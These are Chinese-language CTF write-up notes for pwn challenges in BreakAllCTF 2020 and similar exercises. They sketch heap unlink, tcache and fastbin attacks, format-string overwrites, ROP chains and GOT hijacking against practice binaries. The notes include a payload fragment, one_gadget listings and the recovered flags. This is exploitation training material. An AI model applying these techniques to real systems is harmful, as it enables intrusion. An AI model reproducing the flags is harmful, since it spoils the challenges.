[toc]

# 好厲害 2020  BreakAllCTF PWN-CTF

![./img/Untitled%2027.png](./img/Untitled%2027.png)

![./img/Untitled%2028.png](./img/Untitled%2028.png)

## level 4 heap2-sean_Pwn-6

這題一樣有後門

![./img/Untitled%2029.png](./img/Untitled%2029.png)

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

![./img/Untitled%2030.png](./img/Untitled%2030.png)

看起來好像已經 free 過，因為 malloc 的 q 不等於 0 ，之後他會不斷要求輸入直到蓋寫相關 point ，很明顯這題有 heap overflow

![./img/Untitled%2031.png](./img/Untitled%2031.png)

會不斷 free 就要思考 unlink 的利用，而且這題並沒有 ASLR ，並且這裡正好有一個 heap 地址可以使用，該地址為 p 的位置，因此可以繞過 free 的驗證機制，並且可以蓋寫 p 的值來達成一次的任意寫入。

![./img/Untitled%2032.png](./img/Untitled%2032.png)

![./img/Untitled%2033.png](./img/Untitled%2033.png)

一開始要先定位 forging chunk 的位置，可以透過 gdb  gef 查看相關資訊

![./img/Untitled%2034.png](./img/Untitled%2034.png)

p+0x100-0x10可以看到 q 的 pre size 與 chunk size

![./img/Untitled%2035.png](./img/Untitled%2035.png)

p_addr = 0x601080

```
flat({0: p64(p_addr - 0x18), 8: p64(p_addr - 0x10)}, length=0x100-0x10) + p64(pre_size) + p64(size) + 'a' * (size - 0x10 ) + p64(size) 
```

要注意的是，forge chunk 要往上 -0x10 到完整的 chunk 而非 data 的 ptr

成功 unlink 之後 可以看到指向 0x601068 ，這時只要蓋寫使他指向 got 就可以蓋寫成後門，這邊打算把 gets 給蓋寫掉

![./img/Untitled%2036.png](./img/Untitled%2036.png)

```
BreakALLCTF{XUnGU4wDb65I5hJnNhwH}
```

註: 因為本機使用舊版的 [libc-2.23.so](http://libc-2.23.so/) 進行測試，可能會導致開啟 sh 時 sh 崩潰，但實際上 remote 是可以 getshell 的情況發生

## level 4 heap1-sean_Pwn-5

有後門讓人覺得難度降低很多

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

分析過後，看起像是嘗試重新得到 ptr1 的 chunk ，因為解讀資料只能從該 chunk 取得，並且取得的值會作為指標使用。

![./img/Untitled%2037.png](./img/Untitled%2037.png)

也就是只要傳入一個指標劫持 exit 到後門就可以了

```
BreakALLCTF{WuoLj3KhFzE3ATKLpGvx}
```

## level 4 Angelboy_Pwn-8 zoo

```
Canary                        : ✓
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

c++ 題 x64 

使用的 strcpy 似乎導致 heap overflow ，Dog 與 Cat 皆有問題

![./img/Untitled%2038.png](./img/Untitled%2038.png)

兩個 class 都有 vtable ，敢興趣的是如何劫持

![./img/Untitled%2039.png](./img/Untitled%2039.png)

![./img/Untitled%2040.png](./img/Untitled%2040.png)

嘗試建立多個動物後，猜測 chunk 是某種類似 STL 容器的結構，而上面則是動物本生，並且動物本身會指向一個 fuction point point ，而目的在於如何串該值

![./img/Untitled%2041.png](./img/Untitled%2041.png)

檢查是否能夠執行，因為 nx 沒開啟 heap 和 data 段可以執行，把 shell 寫在 zoo 的 name 上，並且 point 上去做類似上面的結構

![./img/Untitled%2042.png](./img/Untitled%2042.png)

必須注意寫入字串時不可以包含空白，以免 cout 出錯。

可以透過 padding 把 605420 變成 605421 來避免此問題

```
AngelboyCTF{c0DPJYZ9jQlVAtM02SQo}
```



## pwn tcache

```
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✓
RelRO                         : Full
```

可以看到程式不怎麼複雜

![./img/Untitled%2043.png](./img/Untitled%2043.png)

可以知道 1 的時候會觸發 malloc， 2 會觸發 free 

![./img/Untitled%2044.png](./img/Untitled%2044.png)

可以看到該版本的 tcache 可以 double free ，如此，就可以控制 tcache chunk 裡面的 fd ，達到任意寫入的目的

![./img/Untitled%2045.png](./img/Untitled%2045.png)

pie 是關閉的， bss 有 stdout, stderr..

![./img/Untitled%2046.png](./img/Untitled%2046.png)

如果直接把 chunk 指到 stderr 會遇到無效地址，相反的可以往上 8 格指進去，這樣就會當成結尾而清空 tcache bin

![./img/Untitled%2047.png](./img/Untitled%2047.png)

```
one_gadget libc-2.27.so

0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
rsp & 0xf == 0
rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
```

有幾點需要注意，就是就是一開始要先 free 多次來確保 tcache 的 counter 不會變成 -1 來避免問題

```
FLAG{tcache_performance_vs_security}
```

## pwn baby_heap

under out of bound? 似乎不行

![./img/Untitled%2048.png](./img/Untitled%2048.png)

uaf

![./img/Untitled%2049.png](./img/Untitled%2049.png)

maybe leak 

![./img/Untitled%2050.png](./img/Untitled%2050.png)

```
Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✓
RelRO                         : Full
```

這題看起來沒有其他漏洞，可能需要透過 unlink 的手法，

先查看 libc-2.23.so 的保護手法

由於不會清掉 heap 的指標，可以先建立兩個 heap 並且使其合併成一個 chunk ，之後 第二個 ptr 會指向 chunk 的中間，這裡可以在構造一個 fake chunk 來 free  ，

狀態

- 可以得到 unsorted bin 的位置(存疑，不確定是什麼 bin 反正可以 leak libc)
- 可以得到 libc 的 base
- 可能可以 unlink
- 可能可以 one gadget

思路

- 構造 unlink 蓋寫任意 hook ，並且觸發 one gadget

```
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL

objdump -T ./libc-2.23.so  | grep 'hook'
00000000003c67a8  w   DO .bss   0000000000000008  GLIBC_2.2.5 __free_hook
00000000003c9560 g    DO .bss   0000000000000008  GLIBC_2.2.5 argp_program_version_hook
00000000003c92e0 g    DO .bss   0000000000000008  GLIBC_PRIVATE _dl_open_hook
00000000003c4b10  w   DO .data  0000000000000008  GLIBC_2.2.5 __malloc_hook
00000000003c4b08  w   DO .data  0000000000000008  GLIBC_2.2.5 __realloc_hook
00000000003c67b0  w   DO .bss   0000000000000008  GLIBC_2.2.5 __malloc_initialize_hook
00000000003c67a0  w   DO .bss   0000000000000008  GLIBC_2.2.5 __after_morecore_hook
00000000003c4b00  w   DO .data  0000000000000008  GLIBC_2.2.5 __memalign_hook
```



假設直接把 hook 改成 system 啟動 sh 時會崩潰，或許是 ld 或 libc 不合適的原因

最後在不斷下斷點似乎 gadgets  0x4526a 可以成功執行

除錯時可以用 gef 的 heap bin 和 heap chunk 0x0000555555??  去看 heap 的狀態

直接追到特定版本的 malloc.c

[https://github.com/bminor/glibc/blob/ab30899d880f9741a409cbc0d7a28399bdac21bf/malloc/malloc.c#L3385](https://github.com/bminor/glibc/blob/ab30899d880f9741a409cbc0d7a28399bdac21bf/malloc/malloc.c#L3385)

![./img/Untitled%2051.png](./img/Untitled%2051.png)

一開始要先 overlap chunk

參考一下 ctf-wiki

[https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#malloc_hook-chunk](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#malloc_hook-chunk)

發現可以透過偏移的方式來產生 0x7f ，剛好可以放入 fastbin ，來偽造 chunk

```
telescope $malloc_hook-0x3-0x30 50
```

![./img/Untitled%2052.png](./img/Untitled%2052.png)

這邊取 $malloc_hook-0x3-0x20 可以看到成功構造

![./img/Untitled%2053.png](./img/Untitled%2053.png)

因為左移 3 bytes 得到 0x7f ，所以需要透過三個 byte padding 來右移  3 bytes

完成之後寫下 one gadgets 可以看到記憶體被蓋寫

![./img/Untitled%2054.png](./img/Untitled%2054.png)

為了方便除錯 透過 strace 來檢查是否有跑到 syscall ，先嘗試啟動 process 停止讓 strace attach 上 pid

```
./baby_heap.py
```

```
strace -p pid
```

可以看到成功執行 syscall 但是沒有成功 get shell

![./img/Untitled%2055.png](./img/Untitled%2055.png)

測試了一下似乎沒辦法使用，檢查了一下值都不為 null

如果能嘗試劫持 stack 也是可行的，但是缺乏 stack 的基準

![./img/Untitled%2056.png](./img/Untitled%2056.png)

回顧一下 malloc_hook ，如果綁定 system 的話 ，size 在傳入 /bin/sh 的指標即可觸發

![./img/Untitled%2057.png](./img/Untitled%2057.png)

uint 似乎不行

![./img/Untitled%2058.png](./img/Untitled%2058.png)

由於有多個 hook ，或許可以達成連環 call 的效果，可以透握此方法調整 rsp

![./img/Untitled%2059.png](./img/Untitled%2059.png)

而這裡直接跳 realloc_hook

![./img/Untitled%2060.png](./img/Untitled%2060.png)

![./img/Untitled%2061.png](./img/Untitled%2061.png)

![./img/Untitled%2062.png](./img/Untitled%2062.png)

原先的 gadget 如果採用 0x70 的話，推疊在 -8 就可以指向 null 而成立

![./img/Untitled%2063.png](./img/Untitled%2063.png)

get shell

```
FLAG{heap_15_funnnnnnnnnnnnnnnnnnnnnnnnn}
```

## pwn uaf

這題有後門可以使用，並且看地址像沒有 aslr

![./img/Untitled%2064.png](./img/Untitled%2064.png)

一開始先逆向出大部分的功能，可以看出大致的功能

![./img/Untitled%2065.png](./img/Untitled%2065.png)

後門沒有 xref 的情況，代表可能需要透過某種方式控制 rip

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Full
```

這裡可以看到他 malloc 之後在 heap 放入 func point ，只要劫持 func pointer 即可

![./img/Untitled%2066.png](./img/Untitled%2066.png)

因此只需要在 malloc 一個 0xa0 並且 0x98 填上 backdoor 就可以了

```
FLAG{Use_4fter_fre3_i5_d4nger0us_yeeeeeeee}
```

## pwn printable

逆向的時候發現被 symbol 被剝了

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Full
```

進去程式後可以看到程式在回顯

有直接的 print 就有 format string ，讓人意外的好像沒有檢查 printable 字元 (與名稱感覺不一樣)

![./img/Untitled%2067.png](./img/Untitled%2067.png)

先找 one gadget

```
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
rsp & 0xf == 0
rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
```

但是這題沒有比較好的方法可以寫入 ret addr ，觀察堆疊發現 rbp 可以被控制，並且剛好在 ret addr 的位置

![./img/Untitled%2068.png](./img/Untitled%2068.png)

 可以看到 rbp 位於 `%7$p` ，同時下面 `%10$p` 也 leak libc 的 __libc_start_main+231

![./img/Untitled%2069.png](./img/Untitled%2069.png)

希望可以在執行 exit 之後，就直接控制 rip 變數比較少

![./img/Untitled%2070.png](./img/Untitled%2070.png)

也就是說 prog1 的 ret addr 必須為 0401238 ，找到一個位置指向該點，即可蓋寫控制 rip

![./img/Untitled%2071.png](./img/Untitled%2071.png)

回顧之後可以看到該位置位於 `%8$p`

![./img/Untitled%2072.png](./img/Untitled%2072.png)

 %hhn 只會動到一個 byte，但現在依然無法控制第 7 個值，這裡需要一個指標，往前回顧發現 %5$p 正好可以控制該 rbp

![./img/Untitled%2073.png](./img/Untitled%2073.png)

![./img/Untitled%2074.png](./img/Untitled%2074.png)

步驟是

1. 獲取原先 push 的 rbp 與 libc
2. 將 rbp 透過 `%5$hn` 蓋寫最小 byte 成 rbp - 8 指向 ret addr (為了避免 carry 因此 一次寫兩個 bytes)
3. 清理 rsp+0x40
4. 之後只要不斷 (rbp - 8), (rbp - 8) + 1, (rbp - 8) + 2 ... 就可以任意寫入 ret addr
5. 如果必要的時候也可以透過此方法構造 rop chain (通常跑很慢)
6. 最後只需要輸入 exit 就可以觸發 ret addr

這題需要注意每次 format string 都需要清理 buffer ，避免發生 payload 無法正常運行

再來就是 one_gadget 的條件，或許需要清理 rsp+0x40 和 rsp+0x70

可以看到 rsp+0x40 對到 `%16$p` 而 ret addr 在 `%8$p`，先直接使用 `%lln` 進行清理，要把 `%7$p` 控制到該位置

![./img/Untitled%2075.png](./img/Untitled%2075.png)

![./img/Untitled%2076.png](./img/Untitled%2076.png)

如果 offset 還是算不准，就把 ret address 以下的清理乾淨，雖然比較慢

或者清理 rsp+0x40 附近的值

```
FLAG{D0_you_l0ve_my_printf_fmtfmtfmtfmtfmtfmt}
```

## level3 Angelboy_Pwn-6

該題因為是 x86 因此使用 p32  

並且 限制讀入 100 ， 當中包含 rbp 與填充的話就花費 0x20 ，還能使用 17 個 gadgets 

```bash
ROPgadget --binary simplerop --ropchain
```

而透過 ROPGadgets 產生的 rop chain 修改後，可以縮到 24 個 gadgats ，可以把 rop chain 分成兩次  10 與 14 次使用，當中只需要 ret2main 即可

```
AngelboyCTF{auFHG0x3cFVkkPYCkaus}
```

## level3 Angelboy_Pwn-5

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

GLIBC_2.2.5

GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609

題目沒有給 system ，因此自己 leak puts, gets 的 offset ，之後 call system

0x00000000004006f3 : pop rdi ; ret

![./img/Untitled%2077.png](./img/Untitled%2077.png)

```
AngelboyCTF{aR0uNisULrYO4eVnG2jI}
```

## level 3 Angelboy_Pwn-4

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
```

```bash
ROPgadget --binary simplerop_revenge --ropchain
```

這題無法完整塞下 rop chain ，簡單的作法是配置好 ebp 到 data 段，之後 read 到 ebp 並且 stack pivot 上去，不過這次的題目也有 pop rsp

看起來像 buffer overflow

![./img/Untitled%2078.png](./img/Untitled%2078.png)

```
AngelboyCTF{ZnkaWq9OU80usJjGUnax}
```

## pwn level 3 rop2-sean_Pwn-3

可以看到 read 溢位的空間被限制

![./img/Untitled%2079.png](./img/Untitled%2079.png)

至少需要 0x28 個值才會蓋到 ret addr ， 現在只能控制到 rbp 後兩 bytes ，或許不需要 ret2leave ，因為回到 main 之後也會進行一次 leave ，這裡先做這個處理把 rbp 控制往上轉移，因為沒辦法直接蓋寫成 buf2

![./img/Untitled%2080.png](./img/Untitled%2080.png)

當中在除錯的時候 local_28 當中的 0x20 會爛掉，因此只能塞三個 gadgets 嘗試把 rbp 撞到 gadgets 上面觸發 shellcode (1/16)

```
BreakALLCTF{VyvO6XnkNuD30eRKTW9O}
```

## pwn level 3 rop1-sean_Pwn-2

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

```bash
ROPgadget --binary rop1 --ropchain
```

發現這題 rop 其實與原本的差沒多少，只是輸入受到限制 0x46 ，解決方法很簡單 call read 更大的空間即可、

但是題目其實有給 buf2 ，可以把 rop chain 放在裡面，之後在 ret2buf2 前做 stack pivot

不過題目實際上有給 pop rsp ，因此使用該 gadget  即可

0x000000000040060b : pop rsp ; ret

![./img/Untitled%2081.png](./img/Untitled%2081.png)

```
BreakALLCTF{VPnbcUWBsuyxO4WO4PkM}
```

## pwno unlink

這題一樣沒有 binary ，而要讓 unlink 觸發必須要使 block 合併，而這題因為只能 malloc 0x80 = 128的大小，而 128 會放在 unsorted bin or small bin

思路蓋寫 ary 指標

一開始先 malloc 

該題目有 heap overflow 可以使用，因為在構造 unlink 時 fd, bk 需要指向 chunk→pre 的位置 需要另外構造 chunk

思路

因為 free 的時候，是透過自身 size 當中的 flag 來判斷上面有無 free ，因此可以透過上面的 chunk 蓋寫，下面被 free 的 chunk 就會以為上面已經 free 過了，就會進行 unlink ，當中還需要確保可以讓 p→fd→bk == p, p→bk→fd = p

主要想要把 stack 的地址寫到 ary 上面，一旦寫上去之後，就可以開始寫入 deadbeef 取得 flag

## pwno forging_chunk

好像要自己編譯？ 其實遠程崩潰的時候有附贈 backtrace

看題目是要自己偽造一個 chunk ， libc-2.23

思路試想辦法讓 victim 變數在 malloc 的時候可以被 malloc 回傳地址，之後可以透過 write 進行修改

同時程式有 UAF 的漏洞可以使用，可以先 free 之後偽造假的 free chunk list ，因為 LIFO 所以需要 malloc 第二次才是可用的

1. malloc 一個 chuck
2. free 第一個 chunk
3. 寫入假 fd 指向 stack
4. malloc 第一次為原先 UAF 的 chunk
5. malloc 第二次為 stack 上的值
6. 寫入 0xdeadbeef 到第二次 malloc 回傳的指標上

構造方法參見

[https://heap-exploitation.dhavalkapil.com/attacks/forging_chunks](https://heap-exploitation.dhavalkapil.com/attacks/forging_chunks)

## pwno snowman

安裝 angr

## pwno math_teacher

沒有 binary ，看起來是要解方程式，這邊採用 z3 即可

```
flag{y0u_93t_l0o_!n_m4th5}
```

## level 1 Angelboy_Pwn-2

```
AngelboyCTF{YNLfLNEG0GCh3Ipw8stY
```

## level 1 Angelboy_Pwn-1

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
```

內建後門

![./img/Untitled%2082.png](./img/Untitled%2082.png)

```
AngelboyCTF{YodbgBUFJp6ypXRqkKjI}
```

## level 1 張元_Pwn-8

裡面附贈 shellcode 因此只需要改 ret addr

```
BreakAllCTF{G00d_j0000000000b:)}
```

## level 1 張元_Pwn-7

反正就是逆向看每個 stage 符合條件就可以了

## level 1 張元_Pwn-6

就加減乘 

## level 2 rop0-sean_Pwn-1

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

這題明顯要求透過 rop 的方式

```bash
ROPgadget --binary rop0 --ropchain
```

## level 2 oob5-sean_Pwn-1

這題給了 stack 的參考點 rbp-0x28 其實我覺得沒啥用

```
Canary                        : ✓ (value: 0x2e382f7013dda500)
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Full
```

看起來還是 got 但是 got 被保護了 ，不過次就沒有限制 id 的範圍，先計算 rbp 然後往下蓋一個就是 ret addr

![./img/Untitled%2083.png](./img/Untitled%2083.png)

蓋寫 fget的 retaddress就可以了，因為這樣就不會執行 main 了

## level 2 oob4-sean_Pwn-1

```
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

看起來被使用者資料移動到 stack 上了，很有可能要我蓋寫 retaddr

![./img/Untitled%2084.png](./img/Untitled%2084.png)

id 要求小於 4 因此無法蓋寫 retaddr

![./img/Untitled%2085.png](./img/Untitled%2085.png)

並且如果嘗試登入兩次會處發 chk_fail 但是其實可以蓋寫 counter

![./img/Untitled%2086.png](./img/Untitled%2086.png)

![./img/Untitled%2087.png](./img/Untitled%2087.png)

感覺要先找到 rbp 之後就可以蓋寫 got 並且退出，但還是沒辦法實現任意蓋寫位置，因為數值都是 int ，或許可以蓋寫呼叫 read 時回到 main 的 ret addr 就可成功 get shell

```
BreakALLCTF{EpKa0zXqkYldHXKknjqB}
```

## level 2 oob3-sean_Pwn-1

```
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

後門被剝離了

![./img/Untitled%2088.png](./img/Untitled%2088.png)

可以進行 GOT hijack 並且把 puts 蓋寫成 後門

## level 2 oob2-sean_Pwn-1

這題看起來可以寫入 pin

![./img/Untitled%2089.png](./img/Untitled%2089.png)

一樣是透過 offset

![./img/Untitled%2090.png](./img/Untitled%2090.png)

`(0x6010a0 -0x6010c0) // 8`

## level 2 oob1-sean_Pwn-1

似乎可以透過打印 user 來洩漏 pin

![./img/Untitled%2091.png](./img/Untitled%2091.png)

(0x06010a0 - 0x06010c0) / 8 = -4 

![./img/Untitled%2092.png](./img/Untitled%2092.png)

反正就洩漏之後就可以登入 sh

```
BreakALLCTF{CPuPeMrhVrWWx2XueaIr}
```

## level 2 fmtstr

反正就水題

## level 2 Angelboy_Pwn-3

看題目似乎要 ret2lib

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

因為沒有重定位 直接 給 got 地址他會顯示

沒有附贈 libc

GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609

GLIBC_2.2.5

也可以透過兩次 leak 來取得 offset 這裡選後者

分別 leak  puts 與 gets

0x7f686eed96a0 0x7f686eed8d90

![./img/Untitled%2093.png](./img/Untitled%2093.png)

```
AngelboyCTF{4LnoMvnymHAkyLE4k56N}
```

## level 2 張元_Pwn-10 plt

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

## level 2 張元_Pwn-9

```
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

反正程式 leak buff address 就直接跳

## level 2 張元_Pwn-1

反正就算 offset

![./img/Untitled%2094.png](./img/Untitled%2094.png)

## level 1 ret2src

```
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

用個 nop slad

## pwn level 1 secret

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

題目提示 fmt 修改區域變數

![./img/Untitled%2095.png](./img/Untitled%2095.png)

這裡直接用 fmtstr 輔助就可以了，其實看起來可以直接緩衝區溢位，一開始先找到 token 的 offset

![./img/Untitled%2096.png](./img/Untitled%2096.png)

由於需要指定地址，可以看到在 8~11 和 可以輸入地址 a  ，這裡挑第 10 個

![./img/Untitled%2097.png](./img/Untitled%2097.png)

由於實際的記憶體似乎沒有對齊，因為是 int 只需要改 cd 成 37 即可

![./img/Untitled%2098.png](./img/Untitled%2098.png)

除錯可以把 `%11p`  印出來

結果 remote 沒有成功執行 system 不知道是故意的還是出壞

![./img/Untitled%2099.png](./img/Untitled%2099.png)

改用 buffer overflow

```
MyFirstCTF{Us3_f0rm4T_sTr1ng_t0_134k_&_wr1t3}
```

## pwn level 1 echo_server

x64

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

![./img/Untitled%20100.png](./img/Untitled%20100.png)

有現成的後門，可能需要透過一些手法逃逸 不過 canary 關閉的，看起來有 buf overflow 嘗試蓋寫 rsp 找一點 gadget 先 ret gets 在 ret system 但其實只要想辦法把 rdi 導向 cat flag 即可

![./img/Untitled%20101.png](./img/Untitled%20101.png)

![./img/Untitled%20102.png](./img/Untitled%20102.png)

但是 input 如果溢出會影響到其他變數，

## pwn level 1 registration

x64

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

![./img/Untitled%20103.png](./img/Untitled%20103.png)

![./img/Untitled%20104.png](./img/Untitled%20104.png)

 這體看起來只需要重新將 id 傳入就可以，有點類似洩漏的 canary 有開啟 NX 代表需要 rop 不過其實有給後門可以使用，只須蓋寫地址即可

```
MyFirstCTF{B3_c4r3FuL_0f_l0cAl_V4rI4b13_0N_sT4ck_OwO}
```

## pwn fmt-3

```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

可 buf overflow, 寫 got 無 ASLR

![./img/Untitled%20105.png](./img/Untitled%20105.png)

scanf 特性 %s 只吃 whitespace， \0 似乎不吃，根據前面的經驗， `%6$p` 通常為 buffer 起始 (可能是題目的共通性？)，

只讀一次，考慮寫 exit 到 one gadgets  ，由於都是 libc 因此可以考慮只覆蓋少許的 bytes ，若不成功由低到高位 byte 逐漸填滿，而這個可以使用 pwnlib.fmtstr.AtomWrite, pwn.fmtstr.make_payload_dollar 而該方法需要找到傳入的目標 address 所在的 offset

但是可以看到實際上 got 的 exit 是指向 fmt-3 裡面的區段，因此將他改成 main 使程式重複循環

![./img/Untitled%20106.png](./img/Untitled%20106.png)

再來 leak libc 的地址，並且在 main 之下偽造 ret addr ，一旦寫好之後，就可以把 exit 的 got 蓋寫成 ret (如果有需要可以找 pop 相關來控制 rsp) 並且執行 one gadget

在這之前先 leak stack 的內容，找到預定當成 ret addr 的地方，與 leak libc addr

![./img/Untitled%20107.png](./img/Untitled%20107.png)

其實發現或許可以在一開始就傳入想控制的 rip 位置，之後在 把 exit 蓋寫成 pop ; ret 來調整堆疊位置即可 one gadgets

這邊需要注意的是 因為 call exit() 會導致 stack 不斷變化

先 leak libc base 在第二次執行的時候可以發現 `%13$p` 為 libc 的 _IO_file_setbuf+9

![./img/Untitled%20108.png](./img/Untitled%20108.png)

```
one_gadget libc-2.27.so                                                                                                                                   
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
rsp & 0xf == 0
rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
```



```
FLAG{f0rm47_5tring_att4ckkkkkk!!!!}
```

## pwn fmt-2

```
[+] checksec for '/home/ubuntu/fmt-2'
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Full
```

該題需要修改 magic 的數值，而 payload 最多可以 0x4f，依然編寫工具先列出所有 fmtstr 的東西，並且透過一次 payload 就寫入 magic

![./img/Untitled%20109.png](./img/Untitled%20109.png)

編寫 `fmt-2_list.py` 列出之後 grep 

```
./fmt-2_list.py | grep '61'
b'Input:0x6161616270243625baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x6161616461616163baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x6161616661616165baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x6161616861616167baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x6161616a61616169aaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x6161616c6161616baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x6161616e6161616daaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x616161706161616faaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x6161617261616171aaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x61617461616173aaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
b'Input:0x7ffc5e761507aaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
61
b'%61$paaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataa'
b'Input:0x7fff46b11615aaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaBye!\n'
```

這次挑選 `0x61617461616173aaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataa` ，該值在 `%15$p` 上面，而因為小尾表示，0x73 ='s' 為開頭，並且往後 8 個 bytes 得到 saaataa，可知 offset 在 71

但是 fmtstr pwntools 已經提供 fmtstr_payload 可以使用，因此只須找出第一個字串的 offset 即可，而第二個為 `0x6161616270243625baaacaaadaaaeaaafaaagaaahaaaiaa` 因此搜尋該項為第 6 個，因此 offset 由 5 開始

編寫 payload 在 0x404050 寫入  0xfaceb00c

fmtstr_payload

## pwn fmt-1

```
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Full
```

沒有 ASLR

![./img/Untitled%20110.png](./img/Untitled%20110.png)

可以寫入兩次 fmt ，因此第一次可以 print secret ，第二次就可以直接輸入，最大值為 0x20 = 32

編寫 fmt-1_list.py 列出 1-100 個 fmtstr 值 secret 在 bss 段，並且因為沒有 ASLR ，所以地址固定為

0x404050

但似乎找不到該地址在 stack 上

```
./fmt-1_list.py | grep '0x4'
PIE:      No PIE (0x400000)
b'Input:0x4013a5\n'
b'Input:0x401360\n'
b'Input:0x4010d0\n'
b'Input:0x401360\n'
b'Input:0x401213\n'
b'Input:0x40a2ea675129fdf5\n'
b'Input:0x4010d0\n'
b'Input:0x4010d0\n'
b'Input:0x4010fa\n'
b'Input:0x400040\n'
b'Input:0x4\n'
```

因此改找寫入的值，

```
./fmt-1_list.py | grep '61' 
b'Input:0x6161616270243825baaacaaadaaaeaaafaaagaaahaaa\xc2Input:Bye!\n'
b'Input:0x6161616461616163baaacaaadaaaeaaafaaagaaahaaa\xc2Input:Bye!\n'
b'Input:0x6161616661616165aaacaaadaaaeaaafaaagaaahaaa\xc2Input:Bye!\n'
b'Input:0x6161616861616167aaacaaadaaaeaaafaaagaaahaaa\xc2Input:Bye!\n'
61
b'%61$paaacaaadaaaeaaafaaagaaahaaa'
```

